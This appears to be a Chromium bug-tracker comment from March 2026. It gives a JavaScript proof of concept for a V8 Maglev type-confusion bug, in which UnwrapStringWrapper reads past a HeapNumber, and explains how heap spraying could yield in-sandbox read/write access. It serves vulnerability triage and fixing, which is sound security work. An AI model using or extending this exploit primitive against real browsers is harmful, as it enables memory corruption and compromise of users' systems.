dm...@chromium.org<dm...@chromium.org> #7Mar 24, 2026 08:50PM
Here is how to get in-sandbox R/W access using this bug:

let o = { x : "abc" };
o.x = []; // Making non-string, non-const, but still HeapObject

let string_wrapper = new String("abc");

function foo(c) {
  let phi1 = c ? 42 : 0x40000000;
  phi1 + 1; // inserting smi check

  let phi2 = c ? string_wrapper : phi1;
  o.x = phi2;

  return "" + phi2;
}

%PrepareFunctionForOptimization(foo);
foo(true);

%OptimizeMaglevOnNextCall(foo);
foo(true);

print(foo(false));
This leads to calling UnwrapStringWrapper on a HeapNumber, which will just load from it at offset JSPrimitiveWrapper::kValueOffset (= 12), ie, right after the HeapNumber. With the right heap spraying, I'm pretty sure that we can end up loading any attacker-crafted value there. And we return it right away from the function because return "" + phi2 is optimized to return UnwrapStringWrapper(phi2).
